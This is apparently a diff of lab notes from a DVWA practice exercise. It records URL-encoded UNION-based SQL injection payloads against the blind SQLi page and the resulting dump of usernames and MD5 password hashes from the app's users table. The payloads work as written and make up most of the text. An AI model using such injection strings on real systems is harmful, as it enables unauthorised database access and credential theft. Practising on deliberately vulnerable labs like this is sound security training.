@@ -1,1 +1,21 @@
 http://<ip address>/dvwa/vulnerabilities/sqli_blind/?id=1%27%20union%20select%201,database()%23&Submit=Submit#
+http://<ip address>/dvwa/vulnerabilities/sqli_blind/?id=1%27%20union%20select%20user,password%20from%20users%23&Submit=Submit#
+--------------------------output--------------------
+ID: 1' union select user,password from users#
+First name: admin
+Surname: admin
+ID: 1' union select user,password from users#
+First name: admin
+Surname: 81dc9bdb52d04dc20036dbd8313ed055
+ID: 1' union select user,password from users#
+First name: gordonb
+Surname: e99a18c428cb38d5f260853678922e03
+ID: 1' union select user,password from users#
+First name: 1337
+Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
+ID: 1' union select user,password from users#
+First name: pablo
+Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
+ID: 1' union select user,password from users#
+First name: smithy
+Surname: 5f4dcc3b5aa765d61d8327deb882cf99
